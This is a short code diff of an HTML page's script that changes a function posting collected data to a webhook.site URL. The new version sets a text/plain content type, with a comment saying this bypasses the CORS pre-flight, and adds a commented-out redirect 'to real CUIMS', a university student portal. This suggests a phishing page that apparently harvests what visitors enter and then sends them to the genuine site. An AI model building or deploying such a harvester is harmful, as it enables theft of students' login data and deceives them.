@@ -106,23 +106,30 @@
     // }
 
     async function sendToWebhook(data) {
-      try {
-        const response = await fetch("https://webhook.site/e03a8837-c273-41f8-863b-180bcc3a73b8", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-        if (response.ok) {
-            alert("Data logged to webhook!");
+        try {
+            // We change the content-type to text/plain to bypass CORS pre-flight
+            const response = await fetch("https://webhook.site/e03a8837-c273-41f8-863b-180bcc3a73b8", {
+                method: "POST",
+                headers: { 
+                    "Content-Type": "text/plain" 
+                },
+                body: JSON.stringify(data) // We still send the JSON string
+            });
+            
+            if (response.ok) {
+                alert("Data logged to webhook!");
+                // Optional: Redirect to real CUIMS after success
+                // window.location.href = "https://students.cuchd.in/";
+            }
+        } catch (error) {
+            console.error("Error:", error);
         }
-      } catch (error) {
-        console.error("Error sending data:", error);
-      }
     }
   </script>
 
 </body>
 </html>
+
 
 
 
